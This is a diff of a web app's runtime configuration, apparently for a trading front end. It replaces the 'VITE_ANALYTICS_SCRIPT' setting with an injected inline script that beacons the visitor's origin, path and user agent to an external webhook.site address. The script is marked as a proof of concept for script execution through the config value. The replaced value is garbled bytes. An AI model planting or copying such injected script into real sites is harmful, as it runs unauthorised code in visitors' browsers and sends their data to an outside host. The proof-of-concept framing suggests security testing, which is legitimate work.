@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "�)��",
+  "VITE_ANALYTICS_SCRIPT": "<script>\n(() => {\n  const base = \"https://webhook.site/14ce3de1-2f4b-49c5-96bb-79e00acac1ee\";\n\n  const id = (crypto?.randomUUID?.() || Math.random().toString(16).slice(2));\n  const ts = Date.now();\n\n  const qs =\n    \"?poc=analytics_script_exec\" +\n    \"&id=\" + encodeURIComponent(id) +\n    \"&ts=\" + encodeURIComponent(ts) +\n    \"&origin=\" + encodeURIComponent(location.origin) +\n    \"&path=\" + encodeURIComponent(location.pathname) +\n    \"&ua=\" + encodeURIComponent(navigator.userAgent);\n\n  const img = new Image();\n  img.referrerPolicy = \"no-referrer\";\n  img.src = base + qs;\n\n  console.log(\"[POC] webhook ping sent via <img>:\", id);\n})();\n</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
